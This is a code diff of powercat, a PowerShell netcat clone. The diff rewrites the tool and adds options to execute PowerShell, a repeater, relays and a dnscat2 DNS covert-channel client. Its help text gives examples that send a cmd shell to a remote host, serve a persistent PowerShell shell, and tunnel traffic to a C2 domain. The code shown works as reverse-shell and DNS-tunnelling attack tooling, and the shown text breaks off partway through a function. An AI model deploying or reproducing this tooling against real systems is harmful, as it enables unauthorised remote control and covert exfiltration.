@@ -1,131 +1,152 @@
 function powercat
 {
-<#
-  .SYNOPSIS
-    Netcat: The powershell version.
-  .PARAMETER c
-    Client mode: Provide an server to connect to.
-  .PARAMETER l
-    Listen mode: Use this switch to create a listener.
-  .PARAMETER p
-    The port to listen on, or the port to connect to.
-  .PARAMETER e
-    GAPING_SECURITY_HOLE :)
-  .PARAMETER r
-    Relay. Examples: "-r tcp:10.1.1.1:443", "-r tcp:443", "-r udp:10.1.1.1:53"
-  .PARAMETER u
-    Transfer data over UDP.
-  .PARAMETER t
-    Timeout for connecting and listening in seconds. Default is 60.
-  .PARAMETER i
-    Input filepath (string), byte array, or string.
-  .PARAMETER o
-    Output data to Write-Host, in byte format, or in string format.
-  .Parameter d
-    Disconnect immediately after connecting. Input from -i will still be sent.
-#>
   param(
     [alias("Client")][string]$c="",
     [alias("Listen")][switch]$l=$False,
-    [alias("Port")][Parameter(Mandatory=$True,Position=-1)][string]$p="",
+    [alias("Port")][Parameter(Position=-1)][string]$p="",
     [alias("Execute")][string]$e="",
+    [alias("ExecutePowershell")][switch]$ep=$False,
     [alias("Relay")][string]$r="",
     [alias("UDP")][switch]$u=$False,
+    [alias("dnscat2")][string]$dns="",
+    [alias("DNSFailureThreshold")][int32]$dnsft=10,
     [alias("Timeout")][int32]$t=60,
     [Parameter(ValueFromPipeline=$True)][alias("Input")]$i=$null,
     [ValidateSet('Host', 'Bytes', 'String')][alias("OutputType")][string]$o="Host",
-    [alias("Disconnect")][switch]$d=$False
+    [alias("Disconnect")][switch]$d=$False,
+    [alias("Repeater")][switch]$rep=$False,
+    [alias("Help")][switch]$h=$False
   )
+  
+  ############### HELP ###############
+  $Help = "
+powercat - Netcat, The Powershell Version
+Github Repository: https://github.com/besimorhino/powercat
 
+This script attempts to implement the features of netcat in a powershell
+script. It also contains extra features such as built-in relays, execute
+powershell, and a dnscat2 client.
+
+Usage: powercat [-c or -l] [-p port] [options]
+
+  -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
+                  If you are using -dns, specify the DNS Server to send queries to.
+            
+  -l              Listen Mode. Start a listener on the port specified by -p.
+  
+  -p  <port>      Port. The port to connect to, or the port to listen on.
+  
+  -e  <proc>      Execute. Specify the name of the process to start.
+  
+  -ep             Execute Powershell. Start a pseudo powershell session. You can
+                  declare variables and execute commands, but if you try to enter
+                  another shell (nslookup, netsh, cmd, etc.) the shell will hang.
+            
+  -r  <str>       Relay. Used for relaying network traffic between two nodes.
+                  Client Relay Format:   -r <protocol>:<ip addr>:<port>
+                  Listener Relay Format: -r <protocol>:<port>
+                  DNSCat2 Relay Format:  -r dns:<dns server>:<dns port>:<domain>
+            
+  -u              UDP Mode. Send traffic over UDP. Because it's UDP, the client
+                  must send data before the server can respond.
+            
+  -dns  <domain>  DNS Mode. Send traffic over the dnscat2 dns covert channel.
+                  Specify the dns server to -c, the dns port to -p, and specify the 
+                  domain to this option, -dns. This is only a client.
+                  Get the server here: https://github.com/iagox86/dnscat2
+            
+  -dnsft <int>    DNS Failure Threshold. This is how many bad packets the client can
+                  recieve before exiting. Set to zero when receiving files, and set high
+                  for more stability over the internet.
+            
+  -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
+                  connecting. Default: 60
+            
+  -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
+                  established. Used for moving files. You can provide the path to a file,
+                  a byte array object, or a string. You can also pipe any of those into
+                  powercat, like 'aaaaaa' | powercat -c 10.1.1.1 -p 80
+            
+  -o  <type>      Output. Specify how powercat should return information to the console.
+                  Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
+                  Use 'Bytes' for moving binaries and 'String' for moving text.
+            
+  -d              Disconnect. powercat will disconnect after the connection is established
+                  and the input from -i is sent. Used for scanning.
+            
+  -rep            Repeater. powercat will continually restart after it is disconnected.
+                  Used for setting up a persistent server.
+
+  -h              Print this help message.
+
+Examples:
+
+  Listen on port 8000 and print the output to the console.
+      powercat -l -p 8000
+  
+  Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
+      powercat -c 10.1.1.1 -p 443 -e cmd -v
+  
+  Connect to the dnscat2 server on c2.example.com, and send dns queries
+  to the dns server on 10.1.1.1 port 53.
+      powercat -c 10.1.1.1 -p 53 -dns c2.example.com
+  
+  Send a file to 10.1.1.15 port 8000.
+      powercat -c 10.1.1.15 -p 8000 -i C:\inputfile
+  
+  Write the data sent to the local listener on port 4444 to C:\outfile
+      [io.file]::WriteAllBytes('C:\outfile',(powercat -l -p 4444 -o Bytes))
+  
+  Listen on port 8000 and repeatedly server a powershell shell.
+      powercat -l -p 8000 -ep -rep
+  
+  Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp.
+      powercat -l -p 8000 -r tcp:10.1.1.1:9000
+      
+  Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com,
+  sending queries to 10.1.1.1 port 53.
+      powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
+"
+  if($h){return $Help}
+  ############### HELP ###############
+  
+  ############### VALIDATE ARGS ###############
+  if($p -eq ""){return "Please provide a port number to -p."}
   if((($c -eq "") -and (!$l)) -or (($c -ne "") -and $l)){return "You must select either client mode (-c) or listen mode (-l)."}
-  if(($r -ne "") -and ($e -ne "")){return "-r and -e cannot be used at the same time."}
-
-  function Listen
+  if(((($r -ne "") -and ($e -ne "")) -or (($e -ne "") -and ($ep))) -or  (($r -ne "") -and ($ep))){return "You can only pick one of these: -e, -ep, -r"}
+  if(($i -ne $null) -and (($r -ne "") -or ($e -ne ""))){return "-i is not applicable here."}
+  if($l)
   {
-    param($p,$t)
-    Write-Verbose ("Listening on [0.0.0.0] (port " + $p + ")")
-    $Socket = New-Object System.Net.Sockets.TcpListener $p
-    $Socket.Start()
-    $AcceptHandle = $Socket.BeginAcceptTcpClient($null, $null)
-    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
-    while($True)
-    {
-      if($Host.UI.RawUI.KeyAvailable)
-      {
-        if($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode -eq 17)
-        {
-          $Socket.Stop()
-          $Stopwatch.Stop()
-          return 3
-        }
-      }
-      if($Stopwatch.Elapsed.TotalSeconds -gt $t)
-      {
-        $Socket.Stop()
-        $Stopwatch.Stop()
-        return 1
-      }
-      if($AcceptHandle.IsCompleted)
-      {
-        $Client = $Socket.EndAcceptTcpClient($AcceptHandle)
-        break
-      }
-    }
-    $Stopwatch.Stop()
-    Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $port + " [tcp] accepted (source port " + $Client.Client.RemoteEndPoint.Port + ")")
-    $Stream = $Client.GetStream()
-    return @($Stream,$Socket,$Client.ReceiveBufferSize,$null)
+    $Failure = $False
+    netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $p){Write-Output ("The selected port " + $p + " is already in use.") ; $Failure=$True}}
+    if($Failure){break}
   }
-  
-  function Connect
+  if($r -ne "")
   {
-    param($c,$p,$t)
-    Write-Verbose "Connecting..."
-    $Socket = New-Object System.Net.Sockets.TcpClient
-    $ConnectHandle = $Socket.BeginConnect($c,$p,$null,$null)
-    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
-    while($True)
+    if($r.split(":").Count -eq 2)
     {
-      if($Host.UI.RawUI.KeyAvailable)
-      {
-        if($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode -eq 17)
-        {
-          $Socket.Close()
-          $Stopwatch.Stop()
-          return 3
-        }
-      }
-      if($Stopwatch.Elapsed.TotalSeconds -gt $t)
-      {
-        $Socket.Close()
-        $Stopwatch.Stop()
-        return 1
-      }
-      if($ConnectHandle.IsCompleted)
-      {
-        try{$Socket.EndConnect($ConnectHandle)}
-        catch{$Socket.Close(); $Stopwatch.Stop(); return 2}
-        break
-      }
+      $Failure = $False
+      netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $r.split(":")[1]){Write-Output ("The selected port " + $r.split(":")[1] + " is already in use.") ; $Failure=$True}}
+      if($Failure){break}
     }
-    $Stopwatch.Stop()
-    if($Socket -eq $null){return 2}
-    Write-Verbose ("Connection to " + $c + ":" + $p + " [tcp] succeeeded!")
-    $Stream = $Socket.GetStream()
-    return @($Stream,$Socket,$Socket.ReceiveBufferSize,$null)
   }
+  ############### VALIDATE ARGS ###############
   
-  function SetupUDP
+  ############### UDP FUNCTIONS ###############
+  function Setup_UDP
   {
-    param($c,$p,$l)
+    param($FuncSetupVars)
+    $c,$l,$p,$t = $FuncSetupVars
+    $FuncVars = @{}
+    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
     if($l)
     {
       $SocketDestinationBuffer = New-Object System.Byte[] 65536
       $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any), $p
-      $Socket = New-Object System.Net.Sockets.UDPClient $p
+      $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient $p
       $PacketInfo = New-Object System.Net.Sockets.IPPacketInformation
-      $ConnectHandle = $Socket.Client.BeginReceiveMessageFrom($SocketDestinationBuffer,0,65536,[System.Net.Sockets.SocketFlags]::None,[ref]$EndPoint,$null,$null)
       Write-Verbose ("Listening on [0.0.0.0] port " + $p + " [udp]")
+      $ConnectHandle = $FuncVars["Socket"].Client.BeginReceiveMessageFrom($SocketDestinationBuffer,0,65536,[System.Net.Sockets.SocketFlags]::None,[ref]$EndPoint,$null,$null)
       $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
       while($True)
       {
@@ -133,33 +154,27 @@ function powercat
         {
           if($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode -eq 17)
           {
-            $Socket.Close()
+            $FuncVars["Socket"].Close()
             $Stopwatch.Stop()
-            return 3
+            break
           }
         }
         if($Stopwatch.Elapsed.TotalSeconds -gt $t)
         {
-          $Socket.Close()
+          $FuncVars["Socket"].Close()
           $Stopwatch.Stop()
-          return 1
+          break
         }
         if($ConnectHandle.IsCompleted)
         {
-          $SocketBytesRead = $Socket.Client.EndReceiveMessageFrom($ConnectHandle,[ref]([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,[ref]$PacketInfo)
+          $SocketBytesRead = $FuncVars["Socket"].Client.EndReceiveMessageFrom($ConnectHandle,[ref]([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,[ref]$PacketInfo)
           if($SocketBytesRead -gt 0){break}
-          else{return 2}
+          else{break}
         }
       }
       $Stopwatch.Stop()
-      $Encoding = New-Object System.Text.AsciiEncoding
       Write-Verbose ("Connection from [" + $EndPoint.Address.IPAddressToString + "] port " + $p + " [udp] accepted (source port " + $EndPoint.Port + ")")
-      switch($o)
-      {
-        "Host" {Write-Host -n $Encoding.GetString($SocketDestinationBuffer[0..([int]$SocketBytesRead-1)])}
-        "String" {$OutputString += $Encoding.GetString($SocketDestinationBuffer[0..([int]$SocketBytesRead-1)])}
-        "Bytes" {$SocketDestinationBuffer[0..([int]$SocketBytesRead-1)]}
-      }
+      $FuncVars["InitialConnectionBytes"] = $SocketDestinationBuffer[0..([int]$SocketBytesRead-1)]
     }
     else
     {
@@ -174,265 +189,626 @@ function powercat
       {
         $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($c)), $p
       }
-      $Socket = New-Object System.Net.Sockets.UDPClient
-      $Socket.Connect($c,$p)
+      $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient
+      $FuncVars["Socket"].Connect($c,$p)
       Write-Verbose ("Sending UDP traffic to " + $c + " port " + $p)
     }
-    return @($Socket,$Socket,65536,$EndPoint)
+    $FuncVars["BufferSize"] = 65536
+    $FuncVars["EndPoint"] = $EndPoint
+    $FuncVars["StreamDestinationBuffer"] = New-Object System.Byte[] $FuncVars["BufferSize"]
+    $FuncVars["StreamReadOperation"] = $FuncVars["Socket"].Client.BeginReceiveFrom($FuncVars["StreamDestinationBuffer"],0,$FuncVars["BufferSize"],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars["EndPoint"],$null,$null)
+    return $FuncVars
   }
-
-  if($l)
+  function ReadData_UDP
   {
-    $Failure = $False
-    netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $p){Write-Output ("The selected port " + $p + " is already in use.") ; $Failure=$True}}
-    if($Failure){break}
+    param($FuncVars)
+    $Data = $null
+    if($FuncVars["StreamReadOperation"].IsCompleted)
+    {
+      $StreamBytesRead = $FuncVars["Socket"].Client.EndReceiveFrom($FuncVars["StreamReadOperation"],[ref]$FuncVars["EndPoint"])
+      if($StreamBytesRead -eq 0){break}
+      $Data = $FuncVars["StreamDestinationBuffer"][0..([int]$StreamBytesRead-1)]
+      $FuncVars["StreamReadOperation"] = $FuncVars["Socket"].Client.BeginReceiveFrom($FuncVars["StreamDestinationBuffer"],0,$FuncVars["BufferSize"],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars["EndPoint"],$null,$null)
+    }
+    return $Data,$FuncVars
   }
+  function WriteData_UDP
+  {
+    param($Data,$FuncVars)
+    $FuncVars["Socket"].Client.SendTo($Data,$FuncVars["EndPoint"]) | Out-Null
+    return $FuncVars
+  }
+  function Close_UDP
+  {
+    param($FuncVars)
+    $FuncVars["Socket"].Close()
+  }
+  ############### UDP FUNCTIONS ###############
   
-  if($u)
+  ############### DNS FUNCTIONS ###############
+  function Setup_DNS
   {
-    function WriteToStream
+    param($FuncSetupVars)
+    function ConvertTo-HexArray
     {
-      param($Stream,$Bytes,$EndPoint)
-      $Stream.Client.SendTo($Bytes, $EndPoint) | Out-Null
+      param($String)
+      $Hex = @()
+      $String.ToCharArray() | % {"{0:x}" -f [byte]$_} | % {if($_.Length -eq 1){"0" + [string]$_} else{[string]$_}} | % {$Hex += $_}
+      return $Hex
     }
-    function ReadFromStream
-    {
-      param($Stream,$StreamDestinationBuffer,$BufferSize,$EndPoint)
-      return $Stream.Client.BeginReceiveFrom($StreamDestinationBuffer,0,$BufferSize,([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,$null,$null)
-    }
-    function EndReadFromStream
-    {
-      param($Stream,$StreamReadOperation,$EndPoint)
-      return $Stream.Client.EndReceiveFrom($StreamReadOperation,[ref]$EndPoint)
-    }
-    $ReturnValue = SetupUDP $c $p $l
-  }
-  else
-  {
-    function WriteToStream
-    {
-      param($Stream,$Bytes,$EndPoint)
-      $Stream.Write($Bytes, 0, $Bytes.Length)
-    }
-    function ReadFromStream
-    {
-      param($Stream,$StreamDestinationBuffer,$BufferSize,$EndPoint)
-      return $Stream.BeginRead($StreamDestinationBuffer, 0, $BufferSize, $null, $null)
-    }
-    function EndReadFromStream
-    {
-      param($Stream,$StreamReadOperation,$EndPoint)
-      return $Stream.EndRead($StreamReadOperation)
-    }
-    if($l){$ReturnValue = Listen $p $t}
-    else{$ReturnValue = Connect $c $p $t}
-  }
-  
-  try
-  {
-    $Stream = $ReturnValue[0]
-    $Socket = $ReturnValue[1]
-    $BufferSize = $ReturnValue[2]
-    $EndPoint = $ReturnValue[3]
-    if($Stream -eq 1){return "Timeout."}
-    if($Stream -eq 2){return "Connection Error."}
-    if($Stream -eq 3){return "Quitting..."}
-    $StreamDestinationBuffer = New-Object System.Byte[] $BufferSize
-    $StreamReadOperation = ReadFromStream $Stream $StreamDestinationBuffer $BufferSize $EndPoint
-    $Encoding = New-Object System.Text.AsciiEncoding
-    $StreamBytesRead = 1
-    if($i -ne $null)
-    {
-      if(Test-Path $i){WriteToStream $Stream ([io.file]::ReadAllBytes($i)) $EndPoint}
-      elseif($i.GetType().Name -eq "Byte[]"){WriteToStream $Stream $i $EndPoint}
-      elseif($i.GetType().Name -eq "String"){WriteToStream $Stream $Encoding.GetBytes($i) $EndPoint}
-      else{return "Unrecognised input type."}
-      return
-    }
-    $OutputString = ""
-    if($d){return}
     
-    if($r -ne "")
+    function SendPacket
     {
-      if($r.Contains(":"))
-      {
-        if($r.split(":")[0].ToLower() -eq "tcp")
-        {
-          function WriteToRelayStream
-          {
-            param($Stream,$Bytes,$EndPoint)
-            $Stream.Write($Bytes, 0, $Bytes.Length)
-          }
-          function ReadFromRelayStream
-          {
-            param($Stream,$StreamDestinationBuffer,$BufferSize,$EndPoint)
-            return $Stream.BeginRead($StreamDestinationBuffer, 0, $BufferSize, $null, $null)
-          }
-          function EndReadFromRelayStream
-          {
-            param($Stream,$StreamReadOperation,$EndPoint)
-            return $Stream.EndRead($StreamReadOperation)
-          }
-          if($r.split(":").Count -eq 2)
-          {
-            $ReturnValue = Listen $r.split(":")[1] $t
-          }
-          elseif($r.split(":").Count -eq 3)
-          {
-            $ReturnValue = Connect $r.split(":")[1] $r.split(":")[2] $t
-          }
-        }
-        elseif($r.split(":")[0].ToLower() -eq "udp")
-        {
-          function WriteToRelayStream
-          {
-            param($Stream,$Bytes,$EndPoint)
-            $Stream.Client.SendTo($Bytes, $EndPoint) | Out-Null
-          }
-          function ReadFromRelayStream
-          {
-            param($Stream,$StreamDestinationBuffer,$BufferSize,$EndPoint)
-            return $Stream.Client.BeginReceiveFrom($StreamDestinationBuffer,0,$BufferSize,([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,$null,$null)
-          }
-          function EndReadFromRelayStream
-          {
-            param($Stream,$StreamReadOperation,$EndPoint)
-            return $Stream.Client.EndReceiveFrom($StreamReadOperation,[ref]$EndPoint)
-          }
-          if($r.split(":").Count -eq 2)
-          {
-            $ReturnValue = SetupUDP $null $r.split(":")[1] $True
-          }
-          elseif($r.split(":").Count -eq 3)
-          {
-            $ReturnValue = SetupUDP $r.split(":")[1] $r.split(":")[2] $False
-          }
-          else{Write-Output "Bad relay formatting"; break}
-        }
-        else{Write-Output "Bad relay formatting"; break}
-      }
-      else{Write-Output "Bad relay formatting"; break}
-      
-      $RelayStream = $ReturnValue[0]
-      $RelaySocket = $ReturnValue[1]
-      $RelayBufferSize = $ReturnValue[2]
-      $RelayEndPoint = $ReturnValue[3]
-      if($RelayStream -eq 1){return "Timeout."}
-      if($RelayStream -eq 2){return "Connection Error."}
-      if($RelayStream -eq 3){return "Quitting..."}
-      $RelayStreamDestinationBuffer = New-Object System.Byte[] $RelayBufferSize
-      $RelayStreamReadOperation = ReadFromRelayStream $RelayStream $RelayStreamDestinationBuffer $RelayBufferSize $RelayEndPoint
-
-      while($StreamBytesRead -ne 0)
-      {
-        if($Host.UI.RawUI.KeyAvailable)
-        {
-          $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyUp") | Out-Null
-        }
-        if($StreamReadOperation.IsCompleted)
-        {
-          $StreamBytesRead = EndReadFromStream $Stream $StreamReadOperation $EndPoint
-          if($StreamBytesRead -eq 0){break}
-          WriteToRelayStream $RelayStream $StreamDestinationBuffer[0..([int]$StreamBytesRead-1)] $RelayEndPoint
-          $StreamReadOperation = ReadFromStream $Stream $StreamDestinationBuffer $BufferSize $EndPoint
-        }
-        if($RelayStreamReadOperation.IsCompleted)
-        {
-          $RelayStreamBytesRead = EndReadFromRelayStream $RelayStream $RelayStreamReadOperation $RelayEndPoint
-          if($RelayStreamBytesRead -eq 0){break}
-          WriteToStream $Stream $RelayStreamDestinationBuffer[0..([int]$RelayStreamBytesRead-1)] $EndPoint
-          $RelayStreamReadOperation = ReadFromRelayStream $RelayStream $RelayStreamDestinationBuffer $RelayBufferSize $RelayEndPoint
-        }
-      }
+      param($Packet,$DNSServer,$DNSPort)
+      $Command = ("set type=TXT`nserver $DNSServer`nset port=$DNSPort`nset domain=.com`nset retry=1`n" + $Packet + "`nexit")
+      $result = ($Command | nslookup 2>&1 | Out-String)
+      if($result.Contains('"')){return ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)}
+      else{return 1}
     }
-    elseif($e -eq "")
+    
+    function Create_SYN
     {
-      while($StreamBytesRead -ne 0)
+      param($SessionId,$SeqNum,$Tag,$Domain)
+      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + ".00." + $SessionId + "." + $SeqNum + ".0000" + $Domain)
+    }
+    
+    function Create_FIN
+    {
+      param($SessionId,$Tag,$Domain)
+      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + ".02." + $SessionId + ".00" + $Domain)
+    }
+    
+    function Create_MSG
+    {
+      param($SessionId,$SeqNum,$AcknowledgementNumber,$Data,$Tag,$Domain)
+      if($Data -eq ""){$Data = "0000"}
+      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + ".01." + $SessionId + "." + $SeqNum + "." + $AcknowledgementNumber + "." + $Data + $Domain)
+    }
+    
+    function DecodePacket
+    {
+      param($Packet)
+      
+      if((($Packet.Length)%2 -eq 1) -or ($Packet.Length -eq 0)){return 1}
+      $AcknowledgementNumber = ($Packet[10..13] -join "")
+      $SeqNum = ($Packet[14..17] -join "")
+      $ReturningData = ""
+      
+      if($Packet.Length -gt 18)
       {
-        if($Host.UI.RawUI.KeyAvailable)
+        $PacketElim = $Packet.Substring(18)
+        while($PacketElim.Length -gt 0)
         {
-          WriteToStream $Stream $Encoding.GetBytes((Read-Host) + "`n") $EndPoint
-        }
-        if($StreamReadOperation.IsCompleted)
-        {
-          $StreamBytesRead = EndReadFromStream $Stream $StreamReadOperation $EndPoint
-          if($StreamBytesRead -eq 0){break}
-          switch($o)
-          {
-            "Host" {Write-Host -n $Encoding.GetString($StreamDestinationBuffer[0..([int]$StreamBytesRead-1)])}
-            "String" {$OutputString += $Encoding.GetString($StreamDestinationBuffer[0..([int]$StreamBytesRead-1)])}
-            "Bytes" {$StreamDestinationBuffer[0..([int]$StreamBytesRead-1)]}
-          }
-          $StreamReadOperation = ReadFromStream $Stream $StreamDestinationBuffer $BufferSize $EndPoint
+          $ReturningData += [string][char][Convert]::ToInt16(($PacketElim[0..1] -join ""),16)
+          $PacketElim = $PacketElim.Substring(2)
         }
       }
+      
+      return $Packet,$ReturningData,$AcknowledgementNumber,$SeqNum
+    }
+    
+    function AcknowledgeData
+    {
+      param($ReturningData,$AcknowledgementNumber)
+      $Hex = [string]("{0:x}" -f ([uint16]("0x" + $AcknowledgementNumber) + $ReturningData.Length))
+      if($Hex.Length -ne 4){$Hex = (("0"*(4-$Hex.Length)) + $Hex)}
+      return $Hex
+    }
+    $FuncVars = @{}
+    $FuncVars["DNSServer"],$FuncVars["DNSPort"],$FuncVars["Domain"],$FuncVars["FailureThreshold"] = $FuncSetupVars
+    $FuncVars["Tag"] = "dnscat."
+    if($FuncVars["Domain"] -ne "")
+    {
+      $FuncVars["Tag"] = ""
+      $FuncVars["Domain"] = ("." + $FuncVars["Domain"])
+    }
+    
+    $FuncVars["Create_SYN"] = ${function:Create_SYN}
+    $FuncVars["Create_MSG"] = ${function:Create_MSG}
+    $FuncVars["Create_FIN"] = ${function:Create_FIN}
+    $FuncVars["DecodePacket"] = ${function:DecodePacket}
+    $FuncVars["ConvertTo-HexArray"] = ${function:ConvertTo-HexArray}
+    $FuncVars["AckData"] = ${function:AcknowledgeData}
+    $FuncVars["SendPacket"] = ${function:SendPacket}
+    $FuncVars["SessionId"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
+    $FuncVars["SeqNum"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
+    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
+    $FuncVars["Failures"] = 0
+    
+    $SYNPacket = (Invoke-Command $FuncVars["Create_SYN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["Tag"],$FuncVars["Domain"]))
+    $ResponsePacket = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($SYNPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))
+    $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($ResponsePacket))
+    if($DecodedPacket -eq 1){return "Bad SYN response. Ensure your server is set up correctly."}
+    $ReturningData = $DecodedPacket[1]
+    if($ReturningData -ne ""){$FuncVars["InputData"] = ""}
+    $FuncVars["AckNum"] = $DecodedPacket[2]
+    $FuncVars["MaxMSGDataSize"] = (250 - (Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],"",$FuncVars["Tag"],$FuncVars["Domain"])).Length)
+    if($FuncVars["MaxMSGDataSize"] -le 0){return "Domain name is too long."}
+    return $FuncVars
+  }
+  function ReadData_DNS
+  {
+    param($FuncVars)
+    $PacketsData = @()
+    $PacketData = ""
+    
+    if($FuncVars["InputData"] -ne $null)
+    {
+      $Hex = (Invoke-Command $FuncVars["ConvertTo-HexArray"] -ArgumentList @($FuncVars["InputData"]))
+      $SectionCount = 0
+      $PacketCount = 0
+      foreach($Char in $Hex)
+      {
+        if($SectionCount -ge 30)
+        {
+          $SectionCount = 0
+          $PacketData += "."
+        }
+        if($PacketCount -ge ($FuncVars["MaxMSGDataSize"]))
+        {
+          $PacketsData += $PacketData.TrimEnd(".")
+          $PacketCount = 0
+          $SectionCount = 0
+          $PacketData = ""
+        }
+        $PacketData += $Char
+        $SectionCount += 2
+        $PacketCount += 2
+      }
+      $PacketData = $PacketData.TrimEnd(".")
+      $PacketsData += $PacketData
+      $FuncVars["InputData"] = ""
     }
     else
     {
-      $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
-      $ProcessStartInfo.FileName = $e
-      $ProcessStartInfo.UseShellExecute = $False
-      $ProcessStartInfo.RedirectStandardInput = $True
-      $ProcessStartInfo.RedirectStandardOutput = $True
-      $ProcessStartInfo.RedirectStandardError = $True
-      $Process = [System.Diagnostics.Process]::Start($ProcessStartInfo)
-      $Process.Start() | Out-Null
-      $StdOutDestinationBuffer = New-Object System.Byte[] 65536
-      $StdOutReadOperation = $Process.StandardOutput.BaseStream.BeginRead($StdOutDestinationBuffer, 0, 65536, $null, $null)
-      $StdErrDestinationBuffer = New-Object System.Byte[] 65536
-      $StdErrReadOperation = $Process.StandardError.BaseStream.BeginRead($StdErrDestinationBuffer, 0, 65536, $null, $null)
-      
-      while($StreamBytesRead -ne 0)
+      $PacketsData = @("0000")
+    }
+    
+    $ReturningData = ""
+    foreach($PacketData in $PacketsData)
+    {
+      try{$MSGPacket = Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],$PacketData,$FuncVars["Tag"],$FuncVars["Domain"])}
+      catch{ Write-Host "HOST: Failed to create packet." ; $FuncVars["Failures"] += 1 ; continue }
+      try{$Packet = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($MSGPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))}
+      catch{ Write-Host "HOST: Failed to send packet." ; $FuncVars["Failures"] += 1 ; continue }
+      try
       {
-        if($Host.UI.RawUI.KeyAvailable)
+        $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($Packet))
+        if($DecodedPacket.Length -ne 4){ Write-Host "HOST: Failure to decode packet, dropping..."; $FuncVars["Failures"] += 1 ; continue }
+        $FuncVars["AckNum"] = $DecodedPacket[2]
+        $FuncVars["SeqNum"] = $DecodedPacket[3]
+        $ReturningData += $DecodedPacket[1]
+      }
+      catch{ Write-Verbose "HOST: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
+      if($DecodedPacket -eq 1){ Write-Verbose "HOST: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
+    }
+    
+    if($FuncVars["Failures"] -gt $FuncVars["FailureThreshold"]){break}
+    
+    [byte[]]$Data = @()
+    if($ReturningData -ne "")
+    {
+      $FuncVars["AckNum"] = (Invoke-Command $FuncVars["AckData"] -ArgumentList @($ReturningData,$FuncVars["AckNum"]))
+      $Data = $FuncVars["Encoding"].GetBytes($ReturningData)
+    }
+    return $Data,$FuncVars
+  }
+  function WriteData_DNS
+  {
+    param($Data,$FuncVars)
+    $FuncVars["InputData"] = $FuncVars["Encoding"].GetString($Data)
+    return $FuncVars
+  }
+  function Close_DNS
+  {
+    param($FuncVars)
+    Invoke-Command $FuncVars["SendPacket"] -ArgumentList @((Invoke-Command $FuncVars["Create_FIN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["Tag"],$FuncVars["Domain"]))) | Out-Null
+  }
+  ############### DNS FUNCTIONS ###############
+  
+  ########## TCP FUNCTIONS ##########
+  function Setup_TCP
+  {
+    param($FuncSetupVars)
+    $c,$l,$p,$t = $FuncSetupVars
+    $FuncVars = @{}
+    if(!$l)
+    {
+      $FuncVars["l"] = $False
+      $Socket = New-Object System.Net.Sockets.TcpClient
+      $Handle = $Socket.BeginConnect($c,$p,$null,$null)
+    }
+    else
+    {
+      $FuncVars["l"] = $True
+      $Socket = New-Object System.Net.Sockets.TcpListener $p
+      $Socket.Start()
+      $Handle = $Socket.BeginAcceptTcpClient($null, $null)
+    }
+    
+    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+    while($True)
+    {
+      if($Host.UI.RawUI.KeyAvailable)
+      {
+        if($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode -eq 17)
         {
-          $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyUp") | Out-Null
-        }
-        if($StdOutReadOperation.IsCompleted)
-        {
-          $StdOutBytesRead = $Process.StandardOutput.BaseStream.EndRead($StdOutReadOperation)
-          if($StdOutBytesRead -eq 0){break}
-          WriteToStream $Stream $StdOutDestinationBuffer[0..([int]$StdOutBytesRead-1)] $EndPoint
